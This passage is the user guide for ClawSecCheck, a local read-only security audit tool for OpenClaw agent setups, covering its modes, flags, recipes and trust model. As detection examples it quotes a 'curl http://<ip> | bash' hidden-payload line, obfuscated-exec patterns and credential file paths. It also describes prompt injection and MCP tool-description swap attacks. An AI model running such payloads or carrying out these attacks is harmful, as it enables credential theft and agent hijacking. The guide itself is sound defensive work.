# ClawSecCheck — User guide

This is the full user guide: install paths, the main flags, recipes, and trust
detail. Not every flag from `--help` is walked through here individually — some
live in [`SKILL.md`](../SKILL.md), [`docs/FLOW_CHOICES.md`](FLOW_CHOICES.md),
[`docs/OUTPUT_SCHEMA.md`](OUTPUT_SCHEMA.md), [`docs/FAQ.md`](FAQ.md), or
[`references/cli-flags.md`](../references/cli-flags.md) instead; `clawseccheck --help`
is always the exhaustive list. The short version lives in the [README](../README.md).

**`--emit-manifest`** prints a proposed permission manifest (YAML-shaped), derived from
static analysis, for a single skill vetted via `--vet`/`--vet-skill`:

```bash
clawseccheck --vet ./some-skill --emit-manifest
```

Its `true`/`false` capability fields answer **presence** — does the skill's code touch
that capability at all — because that is what a permission grant has to be sized against:
a skill that fetches a fixed URL needs network permission exactly as much as one that
fetches a user-supplied URL. Whether *untrusted input* reaches a capability is the
separate question the `analysis.unshielded_effects` / `guarded_effects` lists answer, and
the document prints both. A field reads `unknown` (never `false`) when the skill's code
could not be analysed at all — an absence is only ever reported for something that was
actually looked at.

Everything below is **local against your OpenClaw setup**, and the scanner
itself makes no network calls. Reading goes beyond just the config file — see
["trust no one"](#important--trust-no-one-including-this-skill) below for the
full read scope. Writing is narrow: nothing here changes your OpenClaw config
itself, with exactly one named, opt-in, confirmation-gated exception
(`--apply-ignore-proposals`, covered where it's introduced below); every other
write goes to ClawSecCheck's own files, noted inline as each flag is
introduced. (When you run it through OpenClaw chat, the report text becomes
part of your conversation and is handled by the model provider your agent
already uses.)

## The three modes

ClawSecCheck is three tools around one honesty rule, told apart by how often you reach
for them:

| Mode | Question it answers | Cadence | Produces |
| --- | --- | --- | --- |
| **A · Full check** | How safe is this setup? | once, deliberately | findings — and a grade **only when all five layers ran** |
| **B · Watch** | What changed since last time? | repeatedly | events, **never a number** |
| **C · Before you install** | Is this thing safe to add? | on the event | INSTALL / CAUTION / DO-NOT-INSTALL — **not a letter** |

Everything else in this guide — CI flags, the risk engine, the trust model, uninstall —
is an instrument *inside* one of these modes, or works with all three. `--menu` shows
the same three, plus a fourth catch-all for everything else:

```text
🦞 ClawSecCheck · v{version}

  1  🔍 Full check            how safe is this setup?
  2  👀 Watch                 what changed since last time?
  3  📦 Before you install    is this thing safe to add?
  4  📋 Everything else       the full list of instruments

  A grade only when all five layers ran — otherwise findings, and what's missing.
```

### The five layers of a full check (Mode A)

A grade is not a property of a single run of the *tool* — it is a property of how much
of the *audit* actually happened:

| # | Layer | Automatic? | How you get it |
| --- | --- | --- | --- |
| 1 | Static: config, files, permissions | yes | the default run |
| 2 | Sweep of what is installed: skills + plugins | yes | `--full` |
| 3 | Logs and trajectories: what already happened | yes, budget-bounded | `--full` (also `--behavioral`, `--analyze-trajectory`) |
| 4 | Agent self-report | **no** — the agent must answer | `--ask` → `--attest` |
| 5 | Live behaviour test | **no** — pokes the running agent | `--canary` / `--dryrun` / `--redteam` / `--multiturn` |

**A letter grade is issued only when all five ran.** Short of that there is no number at
all: the report leads with the most urgent finding, in words, plus a mandatory line
naming which layers did not run — e.g. a bare `clawseccheck` run (missing 3 of 5 —
no installed-skill sweep, no self-report, no live test) prints:

```text
Nothing failed outright — most serious open item: HIGH — <finding title>  [Bxx]
No grade yet — 3 of 5 layers did not run: installed skills and plugins (not reached),
agent self-report (not submitted), live behaviour test (not submitted).
```

`--full` closes layers 2 and 3 (the installed-skill/plugin sweep and the log/trajectory
scan) but still needs a self-report and a submitted live-test verdict — typically fed
back via `--judged-bundle` — before a grade is possible; on its own it still reports
"2 of 5 layers did not run" the same honest way. See [Scoring](#scoring) below for the
full rule, including the distinction between a layer that never ran and one that ran
but didn't cover everything.

## Install & run

```bash
openclaw skills install @gl0di/clawseccheck     # from ClawHub
openclaw skills install git:gl0di/clawseccheck  # or straight from GitHub
# then ask your agent: "audit my OpenClaw setup with clawseccheck"
```

Skill page on ClawHub: **<https://clawhub.ai/gl0di/skills/clawseccheck>**.

Or install it as a standalone CLI (zero dependencies):

```bash
pipx install git+https://github.com/gl0di/clawseccheck   # or: pip install .
clawseccheck --home ~/.openclaw                            # then just `clawseccheck`
python -m clawseccheck                                     # also works
```

Or run the bundled script directly (Linux/macOS):

```bash
python3 audit.py                 # human report + shareable card
python3 audit.py --menu          # the Welcome menu (the three modes + a way into the rest)
python3 audit.py --functions     # the full capability palette (everything it can do)
python3 audit.py --json          # machine-readable
python3 audit.py --card          # just the badge
python3 audit.py --ascii         # plain output (no unicode icons/box)
python3 audit.py --no-color      # disable ANSI colour (see below)
python3 audit.py --home ~/.openclaw
```

The terminal report is colourised (grade, score-bar, severity icons) **only** when output is
an interactive terminal. Colour is switched off automatically when the output is piped or
redirected, by `--no-color`, or by the [`NO_COLOR`](https://no-color.org) environment variable;
`FORCE_COLOR` forces it on. Saved reports (`--save`) are always written as plain text.

On **Windows** use `python` (or `py`); the script auto-detects consoles that can't render
unicode and falls back to ASCII, or force it with `--ascii`:

```bat
python audit.py
py audit.py --card --ascii
```

Cross-platform: pure Python stdlib, pathlib-based paths, and an ASCII fallback for every
output. The read-only audit runs on Linux, macOS, and Windows (Linux + macOS are covered by
CI). **Local-store hardening is POSIX-only, though:** the "owner-only, symlink-safe"
guarantees for `~/.clawseccheck/` (history/state/reports) rely on POSIX `chmod` and
`O_NOFOLLOW`. On **Windows** both degrade — file modes are not enforced as NTFS ACLs (the
store is not owner-restricted) and the symlink-clobber guard is a no-op — so on Windows treat
`~/.clawseccheck/` as an ordinary user file, not a hardened store. The audit results
themselves are unaffected.

## How you get the report

When you run the skill inside OpenClaw, the agent executes `audit.py`, captures its output,
and shows it to you **right there in the chat** — no terminal, no setup. You see:

1. your **Score / Grade** — but only once all five audit layers have run (see
   [The three modes](#the-three-modes)); short of that there is no number, and this slot
   instead carries the most urgent finding in words plus a line naming which layers
   didn't run,
2. an **Inventory by subject** summary (OpenClaw core, host, agents, skills, MCP, channels,
   logs) — each with a rolled-up verdict — followed by **findings grouped by that same
   subject**, most urgent first within each; the Lethal Trifecta shows up here too, as an
   Agents finding, not a separate headline, and
3. a **shareable card** — grade + score + Lethal Trifecta ratio when graded, or the same
   honest "no grade yet (N/5 layers ran)" substitute otherwise, safe to post either way
   (the findings stay private; `--badge` writes the same to an SVG).

To keep a copy, add `--save report.txt` and ClawSecCheck writes the full report to that file
(written only when you ask). For automation, `--json` gives a machine-readable result.

Chat rendering is best-effort — the host agent relays and re-composes that text over its own
channel. The **canonical, deterministic output is always a saved file**: `--save`, `--html`,
`--pdf report.pdf`, or `--badge grade.svg`. If you need something you can rely on byte-for-byte
(or attach as a real file, in the badge/PDF case), use the saved file, not the chat paste. On a
phone/mobile chat client specifically, prefer `--pdf` over `--html` — most mobile clients hand an
HTML attachment over as a download, while a PDF opens inline in the client's own viewer.

## Guided mode

When you run ClawSecCheck inside OpenClaw, the agent walks you through the entire audit
conversationally — you never need to know a flag. Asking for a full check now gets you the
combined pipeline report in one turn: your findings, every installed skill/plugin/MCP
server vetted, the riskiest capability chains, a behavioral replay, and a mandatory
second-opinion review of any borderline call — all in the ONE `--dashboard --full` chat card
(F-153), not a separate follow-up step (see [`SKILL.md`](../SKILL.md) Steps 2-3 for the exact
protocol). `--dashboard --full` on its own still leaves 2 of the 5 audit layers unrun (agent
self-report, live behaviour test), so this one turn reports findings and names that gap
rather than a grade — see [Scoring](#scoring) for what closes it. After every default run,
ClawSecCheck also prints a short **"What you can do next"**
block: a prioritised list of the most relevant follow-up steps for *your* findings, with the
exact command to run each one.

The same list is available two other ways:

```bash
python3 audit.py --next          # print the next-steps block only (after running the audit)
python3 audit.py --json          # includes a "next_actions" array in the JSON envelope
```

The recommendations are driven by your actual results — unvetted third-party skills surface
`--vet`; no monitoring detected surfaces `--monitor`; trifecta exposure surfaces the live
injection tests; and so on. Every suggestion is a further **check** — never remediation.

**ClawSecCheck is reports-only: it never fixes, suggests fixes, or changes your
OpenClaw config.** The human report states what is wrong and why; acting on it
is yours. For machine consumers, each finding still carries structured
`"fix"`/`"remediation"` data in `--json` and SARIF — data for your own
tooling, not something ClawSecCheck renders or offers. (The one exception to
"never changes" anything in your OpenClaw home is `--apply-ignore-proposals`,
which is not a fix — it only appends previously-proposed entries to
ClawSecCheck's own suppression file there, opt-in and confirmation-gated; see
below.)

## Recipes / common prompts

Most people never type a flag — you talk to your agent, it has the skill installed, and it runs
the right command for you. Here are ready-to-say prompts for common goals: what to tell your
agent, what happens, and (for the CLI-minded) the underlying command. Every recipe below is
audit/report only — nothing here ever changes your OpenClaw config. A few recipes write a
local output file ClawSecCheck itself owns (a badge, a monitor snapshot) when you ask for
one — called out in the table.

(This is the human-facing cookbook. For the full agent-facing phrase-to-flag routing table the
skill itself uses, see [`SKILL.md`](../SKILL.md#natural-language-to-tool-quick-map).)

| You say | What happens | Under the hood |
|---|---|---|
| "Audit my setup, is it safe?" | Runs the default check: an inventory-by-subject summary and findings grouped by subject, most urgent first. A bare run alone never earns a letter grade — it's missing 3 of the 5 audit layers — so it leads with the most urgent finding and names what it didn't check instead of a Score/Grade; see [Scoring](#scoring). | `clawseccheck` (no flags) |
| "Is this skill safe to install?" / "Vet this before I install it" | Scans the skill's content for malware patterns, injection directives, and supply-chain risk *before* you enable it — type is autodetected. | `--vet <path>` (or `--vet-skill <path>` / `--vet-plugin <path>` to force an engine) |
| "Is this safe to even download?" | Checks the *source*'s identity (typosquat, known-bad, unpinned ref) with zero network before anything is fetched. | `--vet-source <slug\|url\|pkg>` |
| "Are my MCP servers trustworthy?" | Vets every connected MCP server for supply-chain risk (unpinned installs, plaintext transports, broad OAuth scopes) *and* scans each server's declared tool descriptions for the same malware/injection patterns `--vet` checks a skill for. | `--vet-mcp` |
| "What's the single most important thing to fix?" | The report answers this in its own lead line: findings are ordered most urgent first, and an ungraded run leads with the single most urgent finding in words. Read that — it is the prioritised answer. | `clawseccheck` (no flags) |
| "What should I check next?" | Prints a prioritised list of further ClawSecCheck **checks** worth running given this result — turn on monitoring, run a live injection test, vet a skill, track the trend. By design these are further checks, never remediation, and a couple are suggested on every run, so it is not a per-finding to-do list; for that, read the report itself. | `--next` |
| "Fix this for me" | It won't — ClawSecCheck reports problems and risks, never fixes. Each finding states what's wrong and why; `--json`/SARIF carry structured `fix`/`remediation` data for your own tooling, and the [check catalog](CHECKS.md) documents remediation guidance per check. Nothing is ever applied for you. | `clawseccheck` (read the report) / `--json` |
| "Am I vulnerable to prompt injection?" | Runs live self-tests: a benign injection canary, a broader dry-run harness, or all four harnesses together (canary + red-team + dry-run + multi-turn). | `--canary` · `--dryrun` · `--self-test` |
| "What dangerous actions can my agent actually take?" | Emits a self-report template for your agent to fill in with its real tool/verb inventory, then scores the blast radius (EXEC, DESTRUCTIVE, EGRESS, …) once you feed it back. | `--ask` then `--attest <file>` |
| "Watch for changes over time" | Re-audits and alerts on what changed since last time (new skill, config drift, a memory-file edit, a check leaving PASS). **Note:** this is the one opt-in exception to read-only — it writes a small local snapshot (`~/.clawseccheck/state.json`) so it has something to diff against next run. | `--monitor` |
| "Am I improving? How do I rank?" | Shows your score history over time, or how your current score compares to an offline reference profile — no network either way. Both need a score: `--trend` plots only the graded runs (ungraded ones are recorded but carry no point), and `--percentile` ranks your last complete check — dated, and never presented as this run's — rather than estimating one for this one. | `--trend` · `--percentile` |
| "Share my result without leaking my findings" | Produces just the grade + score (+ Lethal Trifecta ratio) — safe to post; your actual findings never appear. On an ungraded run it reads `no grade yet` and names how many layers ran, which is the correct artifact, not an error. | `--card` (prints it) · `--badge grade.svg` (writes an SVG) |
| "What's actually installed — skills, MCP servers, plugins, versions?" | Exports a local bill-of-materials (skills, MCP servers, **installed plugins**, hashes, declared/unpinned dependencies) as JSON. The export records the `scanned_home` it read and a `config_found`/`complete` pair, so an empty BOM for a path that holds no OpenClaw setup is distinguishable from a real setup with no components — a typo'd `--home` must not read as "everything was uninstalled". `complete` is true only when the config was found, nothing was withheld from `skills` (`self_excluded_skills` empty), **and** the installed-plugin index (`installed_plugin_index.plugins_json`, the same source `--full`'s plugin sweep reads) was itself read cleanly (`plugins_scanned`) — a home whose plugin index couldn't be read reports `complete: false` rather than a `plugins` array that is silently empty. A skill bundled with a plugin (e.g. an OpenClaw core extension's own skill) names its supplying plugin in `SkillEntry.supplier`, or `"unknown"` when it's confirmed bundled but the specific plugin can't be resolved — never a guess from the name. | `--sbom` |
| "I think I've been compromised — help me preserve evidence" | Bundles a findings snapshot, skill/MCP hashes, trajectory-log hashes, and a credential rotation list into one local JSON file — a preservation aid, never rotates or deletes anything itself. The rotation list names credentials by **config path only, never by value**, and marks an entry it could not confirm as `unconfirmed` rather than omitting it, so a blank line in it is not evidence of nothing to rotate. | `--incident` |
| "Did a suspicious skill's instruction actually run?" | Post-hoc correlation: checks whether the credential/exfil/secret-path indicators an installed skill names show up in real `tool.call` arguments in your OpenClaw trajectory sidecars — "acted on" vs "present but not acted on". Reads args in memory only; never echoes them. An explicit `PATH` that does not resolve — absent, a directory, or unreadable — is named and exits non-zero, instead of being reported as "this host has no trajectories"; with no `PATH` that message is the correct one and the exit code stays `0`. | `--analyze-trajectory` |
| "What did my agent actually DO, not just what it could do?" | Reconstructs observed tool-call sequences from your OpenClaw trajectory sidecars and flags a proven-by-log ingress→sensitive→egress verb order, or a repeated-failure-then-success pattern on a sensitive-data call. Also reads OpenClaw's OWN runtime `audit_events` trail (a separate, metadata-only record: `tool_name` alone, no argv/command/path/host) for a runtime tool-block, an evasive/malformed tool name, or a session your trajectory sidecar no longer has (it was disabled or rotated out while `audit_events` still retained it). Metadata-only throughout — verb identity and sequencing, never call/return payloads. WARN-only, never scored. When every detector returns UNKNOWN (no trajectory sidecar, no `audit_events`), the run reports **no verdict** rather than a clean tick — nothing was assessed. An explicit `PATH` that does not resolve is named and exits non-zero, instead of being reported as "this host has no trajectories". | `--behavioral` |
| "Gate my CI on this" | Machine-readable output plus a non-zero exit when an unsuppressed finding at or above a chosen severity exists, or when any unsuppressed FAIL exists — wire straight into a pipeline. Needs no score, so it works on a default (ungraded) run too. | `--json` · `--sarif results.sarif` · `--fail-on high` · `--exit-code` |
| "Don't skip anything — scan everything" | Raises the trajectory-file / log-sink / per-line scan caps a normal run keeps small for speed: every trajectory file (not just the most recent 60), a 16x larger per-sink byte cap, and a log/transcript-sink **byte** budget that is raised only modestly (9 MiB to 12 MiB) but is now what decides the set — chosen up front from each sink's age and size rather than by the clock, so two runs over an unchanged corpus scan the same sinks (raised, not removed — a sink still left out is disclosed, never silently dropped), and the full byte range of an over-length log line (not just its head and tail). Slower, and still not a guarantee of the whole corpus on a large fleet — a normal run already discloses exactly what it skipped, and `--exhaustive` states its own coverage the same way, so this narrows the gap rather than closing it outright. | `--exhaustive` (composes with `--full`; has effect on its own too) |

## What it checks

The complete, always-current reference is the generated
**[check catalog](CHECKS.md)** — verdict semantics, remediation, and compound
risk chains for every check — plus the **[threat coverage matrix](THREAT_COVERAGE.md)**.
The narrative version, in one paragraph per theme:

- **Lethal Trifecta** (untrusted input × sensitive data × outbound actions — keep ≤2 of 3),
  gateway exposure & channel auth, plaintext secrets, least privilege, execution sandbox,
  plugin/skill supply-chain integrity, bootstrap-file injection surface, memory poisoning,
  human approval, secret-leak/redaction, TLS, and local-first/model hygiene.
- **Installed-skill / plugin vetting** scans the *content* of skills you downloaded
  (not made yourself) for the ClawHavoc malware class, including base64-hidden payloads.
  A static **Python AST** pass (stdlib `ast`, parse-only — never executed) catches what
  obfuscation regexes miss — `exec(base64.b64decode(...))`, `getattr(os,"sys"+"tem")(...)`,
  `__import__("os").system(...)` — plus prompt-injection / hide-from-user directives embedded
  in a third-party skill's prose, and a **taint trace** that flags a credential **file's**
  contents (`~/.ssh/id_*`, `.aws/credentials`, keychain, wallet, …) flowing into a network
  sink ("read a secret file → send it out"). Sources are credential files only, not env vars,
  so the legit "read `OPENAI_API_KEY`, send as auth header" pattern is never flagged.
  (AST is Python-only; JS/shell stay on the regex engine.)
- **Egress & trust boundaries:** where the agent can reach out (channels, external skills,
  tools), MCP server trust, untrusted-context exposure, sender identity strength,
  control-plane reachability, browser/SSRF exposure, and OpenClaw's documented
  `dangerously*` break-glass overrides.
- **Agent behavior & autonomy:** write-protection of identity/memory files, tool-output
  trust boundaries, self-modification risk, approval-bypass directives, subagent
  delegation, autonomy/heartbeat steering, and session-visibility leaks.
- **The attestation layer** closes what a config file cannot show: `--ask` emits a template
  your agent fills with its *real* tool/verb inventory, `--attest` feeds it back, and the
  engine classifies the held verbs by blast radius (`EXEC`, `MAILBOX_CONFIG`, `DESTRUCTIVE`,
  `EGRESS`, `REVERSIBLE`) and cross-checks the self-report against the config. Attested
  findings are marked `ATTESTED` — advisory, never overriding a config fact. The same
  self-report lets per-agent privilege separation and cross-agent trifecta reassembly
  (confused-deputy chains) be assessed; without it those checks honestly report `UNKNOWN`.
- **Data at rest & host posture:** group/world-readable memory/log directories,
  at-rest write protection of bootstrap files and the OpenClaw install tree, plus a
  read-only detection of host defensive monitors (paths, `PATH`, the text of a few known
  firewall config files, and on Windows a handful of read-only registry queries) — network
  IDS, audit logging, file-integrity monitoring, EDR, host firewall. LOW severity, never
  FAIL: a missing monitor is at most a WARN, and anything not determinable read-only is
  `UNKNOWN`.
- **Incident readiness:** presence and tamper-resistance of OpenClaw's per-session
  trajectory sidecars — the on-disk record a post-incident investigation depends on.

**Mapped to OWASP.** Each check is tagged with its **OWASP Top 10 for LLM Applications (2025)**
category (surfaced per finding in `--json` as `"owasp": [...]`), and the checks are mapped to the
agent-specific **OWASP Agentic (ASI)** threat classes — tool misuse, multi-agent identity/privilege
abuse, insecure inter-agent communication, cascading blast-radius — that an app-code reviewer never
sees. Full matrix in [`THREAT_COVERAGE.md`](THREAT_COVERAGE.md).

## Why another audit tool?

The built-in `openclaw security audit` and tools like Trent/ClawSec are good — but:

- The native audit **does not inspect the content of your bootstrap files**
  (`SOUL.md`, `AGENTS.md`, `TOOLS.md`): they're injected into the system prompt as *trusted
  context* with no validation. ClawSecCheck **does** check them for prompt-injection-prone
  directives.
- ClawSecCheck's scanning engine is **fully local** — no API key, nothing transmitted (Trent uploads your config;
  the native one is CLI-only).
- It leads with a **shareable card** you can post to the community without ever exposing
  your actual findings — a Score + Grade + Lethal Trifecta ratio once all five audit
  layers ran, or the same honest "no grade yet" substitute short of that (see
  [Scoring](#scoring)).

## Built-in native audit, included for you

Non-technical users will never open a terminal to run OpenClaw's own
`openclaw security audit`. So ClawSecCheck runs it **for you** (read-only) and folds its
findings into the same plain-language report — one button shows both ClawSecCheck's checks
*and* the platform's own audit. Native findings are shown but are **not** mixed into the
ClawSecCheck score (kept deterministic). Disable with `--no-native`.

## Trust & provenance

ClawSecCheck is **open source and zero-dependency (Python stdlib only)**. Its own checks are
**read-only and offline** — they make **no network calls** and never change your OpenClaw
config. **The scanner itself makes no network calls.** Full read scope:

- `~/.openclaw/openclaw.json` and workspace bootstrap files (`SOUL.md`, `AGENTS.md`, etc.)
- text of installed skills/plugins (Python files are AST-parsed, never executed)
- `~/.openclaw/logs/config-audit.jsonl` and `config-health.json` (config-log checks)
- `~/.openclaw/agents/.../sessions/*.jsonl` (approval-policy posture)
- the cron job store, the two global OpenClaw dotenv files, and OpenClaw-related systemd
  user-unit environment lines
- the ClawHub CLI's own token-store path — outside the OpenClaw home — for the B182
  credential-hygiene check
- host OS recon for IDS/FIM/EDR/firewall: existence of their config files and binaries on
  `PATH`, the text of a few known firewall config files (`/etc/ufw/ufw.conf`,
  `/etc/nftables.conf`, macOS `com.apple.alf.plist` — read for on/off and default outbound
  policy), and on Windows a handful of read-only registry queries for the same signals
- the host's real listening TCP sockets, read from `/proc/net/tcp` and `/proc/net/tcp6`, plus a
  read-only `/proc/*/fd` walk (and the matched process's `comm`/`cmdline`) to identify which
  process holds a listener — the runtime signal B340 corroborates the declared `gateway.bind`
  against. No subprocess is ever run, and where `/proc` is unavailable the result is an honest
  "unavailable", never a guess; skip it with `--no-sockets`
- the installed OpenClaw npm dependency tree — **outside the OpenClaw home**: the OpenClaw
  package root is located from your `PATH` (no subprocess, and the manifest it finds there must
  name the package it claims to be), then that package's `node_modules` is walked for each
  package's `package.json`, each package root's `binding.gyp`, and the in-package files those
  name as install-time targets (B349). Bounded to 2,000 packages, symlinks are never followed,
  and nothing found there is ever executed; skip it with `--no-deptree`
- credential-store path-existence inventory: whether `.env`, SSH key dirs, keychain/keyring
  directories, and browser cookie stores **exist** near the agent home — contents never read.

(`collector.py`'s `LIMIT_DOMAIN_*` constants name the collector's own read domains: config,
bootstrap, skill, plugin, cron, approvals, env, agents, audit. The socket scan and the
dependency-tree walk are separate read-only modules — `sockets.py` and `deptree.py` — and
register no collector domain of their own.)

The only thing it writes by default is a one-line
entry to a **private, owner-only** local score history (`~/.clawseccheck/history.jsonl`) so you can
track your grade over time — opt out with `--no-history`. A run that earned no grade (its check
did not complete all five layers) still records its line, so the timeline stays unbroken, but that
line carries no score and no letter rather than a number the report itself withheld. Everything
else is written only when you
ask: a report file (`--save`), the `--monitor` snapshot and change journal
(`~/.clawseccheck/state.json`, `events.jsonl`), a badge (`--badge`),
HTML/SARIF/PDF (`--html`/`--sarif`/`--pdf`), a log (`--log`), a small freshness ledger (`~/.clawseccheck/coverage.json`) recording when you
last ran an active self-test (`--canary`/`--redteam`/`--dryrun`/`--self-test`/`--vet-mcp`), and —
the one write that lands inside the audited OpenClaw home rather than under
`~/.clawseccheck/` — `--apply-ignore-proposals`, opt-in and confirmation-gated, appending
previously-proposed entries to `<home>/.clawseccheckignore` (never inventing one). It is
idempotent and says so: re-applying the same proposals reports which entries were already
present instead of asking you to confirm writes it is not going to make.

The **only** external command it can run is your own, fixed and read-only:

```text
openclaw security audit --json
```

No shell, read-only mode only, with a timeout; skip it entirely with `--no-native`. The entire
source is in [`clawseccheck/`](../clawseccheck/) — read it before you trust it. Amid the ClawHavoc
malicious-skill wave, an audit skill should prove its own safety; this one does.

## Important — trust no one (including this skill)

OpenClaw skills are **not sandboxed**: an installed skill runs with your agent's full
permissions. The ClawHavoc campaign poisoned ClawHub with **hundreds of malicious skills**
that steal credentials and crypto wallets — a single line of markdown can hide a
`curl http://<ip> | bash`.

So, before you download, install, or use **any** skill (this one included):

1. **Read the source** — it's plain text. If you can't see what it does, don't run it.
2. **Have your agent analyse it for you** — ask OpenClaw to review the skill's `SKILL.md`
   and scripts for shell-exec, credential access, paste-host uploads, and obfuscated
   (base64) payloads *before* enabling it. ClawSecCheck does this with `--vet <skill>`.
3. **Pin a known release**, prefer signed / VirusTotal-clean skills, and rotate any secret a
   skill could have reached if you ever suspect it.

ClawSecCheck practises this: it is open source, zero-dependency, read-only, and its
installed-skill check does exactly this vetting on the skills you've *already* installed.
Trust is earned by being readable — so read it.

**Verifying ClawSecCheck itself hasn't been tampered with.** `clawseccheck --verify-self`
prints a SHA-256 digest of the engine's own source — but a digest computed *from inside* a
possibly-modified copy is only a tripwire, not proof (a tampered `integrity.py` could print
anything). The trusted reference lives out-of-band: every GitHub Release publishes a
`SHA256SUMS.txt` (same digest format `--verify-self` prints) signed with
[cosign](https://github.com/sigstore/cosign) in keyless mode via the release workflow's own
GitHub Actions OIDC identity — no private key for anyone to leak or steal. Verify it before
trusting the comparison:

```bash
# Get the release assets (adjust the version):
curl -LO https://github.com/gl0di/clawseccheck/releases/download/vX.Y.Z/SHA256SUMS.txt
curl -LO https://github.com/gl0di/clawseccheck/releases/download/vX.Y.Z/SHA256SUMS.txt.bundle

cosign verify-blob \
  --bundle SHA256SUMS.txt.bundle \
  --certificate-identity-regexp "^https://github.com/gl0di/clawseccheck/" \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  SHA256SUMS.txt
```

A passing `cosign verify-blob` proves `SHA256SUMS.txt` was produced by *this repo's* release
workflow and hasn't been altered since — not that the CI pipeline itself is uncompromisable.
This closes the loop against opportunistic tampering of a downloaded copy; it is not a
guarantee against a targeted adversary who also compromises the CI pipeline.

**What the digest covers, and when the command exits non-zero.** The walk hashes every file
in the package tree at every depth, *except* the contents of the regenerated-artifact
directories `__pycache__`, `.ruff_cache`, `.mypy_cache`, `.pytest_cache` and `.git` — those
vary between a dev checkout and a clean install, so hashing them would make the digest
irreproducible and useless for comparison.

A **symlink** — file *or* directory, including a symlinked `__pycache__` — is covered by its
name and target, never by following it: adding, removing, renaming or repointing one changes
the combined digest and the run prints a `Coverage note` naming it, but whatever it points at
lies outside the scan.

**The known residual:** a symlink *inside* one of those excluded directories is not seen at
all, because nothing in them is read. That includes a symlinked `.pyc` planted inside a real
`__pycache__` — the entry is not classified either way, matching the "never follow a symlink
to content" rule used everywhere else in this scan. Keep `~/.clawseccheck` and your install
directory writable only by you; anyone who can write there can do worse than this anyway.

**A narrower case is disclosed, not silently missed.** A real (non-symlinked) `.pyc` dropped
directly inside a real `__pycache__` is still never hashed into `combined` — compiled
bytecode varies by interpreter, so folding it in would make the digest irreproducible
between a dev checkout and a clean install. But if that file is a PEP 552 *hash-based,
unchecked* `.pyc` — the kind Python imports without validating against the `.py` it claims
to come from — `--verify-self` now names its mere presence under a `Coverage note` in the
printed output (the `__pycache__` directory and the filename(s)), without moving `combined`
and without changing the exit code: this is a disclosure, not a verdict. An ordinary
timestamp-based `.pyc` — what a default `py_compile.compile()` call or a normal `import`
always produces — never triggers it; the unchecked-hash form requires an explicit,
non-default compile flag that no ordinary build/test/install step uses.

If a file or directory **cannot be read**, the digest necessarily covers less than the tree it
names: the run prints `INTEGRITY CANNOT BE ESTABLISHED`, names each path and the reason, and
**exits 1** — that digest must not be compared against a release checksum. A path that simply
*disappeared* mid-scan is reported separately, neutrally, and still exits 0: that is what an
update running alongside the scan looks like, not tampering.

A disclosed symlink is worth a look, not an alarm on its own. This project's own installs have
none (the git index carries no symlink entries, and the ClawHub-installed copy has none), but
in-package symlinks are legitimate elsewhere in the Python ecosystem — Debian's
`python3-babel` and `python3-netaddr` both ship them.

**The same principle applies to the host itself.** If a machine is already compromised,
anything running on it at your own privilege level — ClawSecCheck included — can in
principle be tampered with so it hides the compromise; `--verify-self` catches lazy
tampering, not a targeted adversary who patches the verifier too. The honest fix is to
scan the suspect config from a separate, clean machine via `--home`, not to trust a
self-check running on the box in question. See
[What if the host is already compromised?](FAQ.md#what-if-the-host-is-already-compromised)
in the FAQ for the full protocol.

## Updating

OpenClaw remembers where a skill came from, so users get your new versions by updating:

```bash
openclaw skills update clawseccheck   # pull the latest from its source (Git/ClawHub)
clawhub update --all                  # update every installed skill
```

(Or re-run the install command.) An auto-updater skill / `update.auto.enabled` in
`~/.openclaw/openclaw.json` can update on a schedule. Because skills run with the agent's full
permissions, a malicious *update* is a real supply-chain risk — so each release here is tagged
and the source is public to read **before** updating. Prefer reviewing/pinning a tag over blind
auto-update for anything security-sensitive.

> **First call after an update looks empty?** Some OpenClaw versions reload a freshly-updated
> skill lazily, so the *first* invocation right after an update can return nothing; just run it
> again. This is an OpenClaw skill-reload timing artifact on the runtime side, not the audit —
> confirm the engine is live with `clawseccheck --verify-self`.

**Staleness reminder (offline).** A stale security scanner is itself a risk — an old build misses
the latest checks, the same "outdated install is the attack target" hygiene ClawSecCheck flags in
others (B25 / C4) — so the default report may print a one-line "your build may be out of date"
notice. It is **100% offline**, built from two signals: (a) the local clock read against the
baked-in build date, plus an optional local hint file `~/.clawseccheck/latest.json` that your
distribution layer or agent may write (ClawSecCheck never fetches that file, and never writes it
as a side effect of an audit); and (b) a hedged nudge that fires only when an overwhelming majority
of *scored* checks came back UNKNOWN on a populated config — a possible sign OpenClaw moved a field
path and this build is stale for your version. It is deliberately worded as a possibility ("either
a minimal setup, or possibly stale"), never an assertion, and computes purely from this run's own
findings — no network, no schema fetch. ClawSecCheck **never checks for its own updates over the
network** (that would break its zero-network promise and it would have to flag itself) — the
actual "is there a newer version?" lookup belongs to your package tooling or your agent. Silence
the notice with `--no-update-notice` or `CLAWSECCHECK_NO_UPDATE_NOTICE=1`; after any update, verify
the engine with `--verify-self`.

## Threat monitoring

Two complementary things:

**Do you have monitoring at all?** ClawSecCheck checks whether you have threat
monitoring/detection set up — an agent with none won't alert you if it's compromised. It looks
for a monitoring skill/plugin (ClawSec, `openclaw-security-monitor`, …) or monitoring/alerts
config; if none is found it warns you and tells you how to add one.

**`--monitor` — Agent Watch.** One way to *get* monitoring: re-audit on a schedule and alert,
**by severity**, on what **changed** — a new or modified installed skill, `SOUL.md` drift, **any
file appearing, changing or disappearing under `<workspace>/memory/`** (a new file there is
reported even when nothing in it looks hostile — that subtree is where OpenClaw's own
pre-compaction flush writes, so its appearance is INFO, not an accusation), a dropped
score (on the pair of runs being compared, when both carry a grade — see
[Scoring](#scoring); the file/config/MCP/channel signals here don't depend on either
run having one), **a check leaving PASS (for FAIL,
WARN or UNKNOWN)**, **a newly connected MCP server, a new channel, the gateway becoming
network-exposed, or a host monitor disappearing**. Each run appends the changes to a private local
journal (`~/.clawseccheck/events.jsonl`, owner-only, never uploaded); view the timeline with
`--watch-log`.

A regression alert carries the **catalog severity of the check that regressed**, so a CRITICAL
check going FAIL is reported as CRITICAL — matching how the full audit renders the same finding —
rather than a flat HIGH for every check.

**MCP rug-pull, including a launch-spec-identical tool-description swap.** `--monitor` compares
each MCP server's launch spec (command, args, transport, url, env key names, oauth scope) run to
run — but a server can also keep that spec byte-identical while silently changing what it tells
the model a tool *does* after you already approved it. When local trajectory sidecar evidence is
available (what the host actually sent the model — see `--vet-mcp` docs on trajectory sourcing),
`--monitor` also tracks that OBSERVED tool surface per server and alerts when a tool's description
changed (or a new one appeared) even though the launch spec didn't move — a distinct signal from a
launch-spec change, because it means the identical trusted process is now telling the model
something different. This tool-surface source is entirely optional: a host with no trajectory
